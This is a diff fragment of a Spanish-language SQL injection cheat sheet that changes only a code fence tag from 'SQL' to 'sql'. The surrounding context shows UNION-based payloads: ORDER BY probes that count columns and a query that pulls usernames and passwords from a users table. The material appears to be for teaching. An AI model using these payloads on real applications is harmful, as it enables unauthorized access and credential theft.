@@ -46,7 +46,7 @@ Permite entrar a una cuenta sin contraseña.
 ### 2. Detección de Columnas (UNION Based)
 Para saber cuántas columnas tiene la tabla actual.
 
-```SQL
+```sql
 ' ORDER BY 1--
 ' ORDER BY 2--
 ' ORDER BY 3--
@@ -55,7 +55,7 @@ Para saber cuántas columnas tiene la tabla actual.
 ### 3. Extracción de Datos
 Una vez sabemos el número de columnas, extraemos información sensible.
 
-```SQL
+```sql
 ' UNION SELECT NULL, username, password FROM users--
 ```
 
